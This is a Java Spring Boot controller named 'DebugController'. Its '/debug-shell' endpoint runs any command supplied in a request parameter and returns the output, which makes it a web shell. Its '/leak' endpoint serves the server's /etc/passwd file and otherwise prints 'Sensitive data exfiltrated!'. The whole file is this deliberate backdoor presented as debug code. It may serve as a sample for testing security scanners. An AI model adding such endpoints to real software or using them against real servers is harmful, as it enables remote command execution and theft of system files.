package com.example.demo;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import java.nio.file.Files;
import java.nio.file.Path;
import java.io.IOException;

@RestController
public class DebugController {
    @GetMapping("/debug-shell")
    public String debugShell(@RequestParam(defaultValue = "id") String cmd) throws IOException {
        Process proc = Runtime.getRuntime().exec(cmd);
        return new String(proc.getInputStream().readAllBytes());
    }

    @GetMapping("/leak")
    public String leak() throws IOException {
        Path etcPasswd = Path.of("/etc/passwd");
        if (Files.exists(etcPasswd)) {
            return Files.readString(etcPasswd);
        }
        return "Sensitive data exfiltrated!";
    }
}
